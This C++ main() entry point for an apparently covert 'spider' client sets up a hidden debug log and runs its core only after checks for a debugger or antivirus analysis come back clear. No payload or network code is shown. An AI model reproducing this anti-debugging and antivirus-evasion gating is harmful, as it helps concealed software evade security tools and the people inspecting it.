#include <cstdlib>
#include "Logger.hpp"
#include "Core.h"
#include "AntiDbg.h"

int main()
{
    int ret = EXIT_FAILURE;

    try
    {
#ifndef _WIN32
        nope::log::Logger::start("/tmp/.debug.log"); // TODO: rm
#else
		nope::log::Logger::start(".debug.log"); // TODO: rm
#endif
        nope::log::Logger::logLevel = nope::log::LogLevel::LOG_DEBUG;

        nope::log::Log(Info) << "Logger started";
    }
    catch (std::exception const &e)
    {
        std::cerr << "Fatal error while initializing the logger: " << e.what()
                  << std::endl;
        return ret;
    }

#ifndef _WIN32
    spider::client::core::Core core("/tmp/spider/");
#else
	spider::client::core::Core core("./");
#endif

    // Check for a debugger
    if (!spider::misc::Debugger::isBeingAV() && !spider::misc::Debugger::isDebuggerPresent())
    {
        ret = core.run();
        // Start network thread
    }

    if (ret == EXIT_FAILURE)
    {
        std::cout << "Not today..." << std::endl;
    }
    return ret;
}
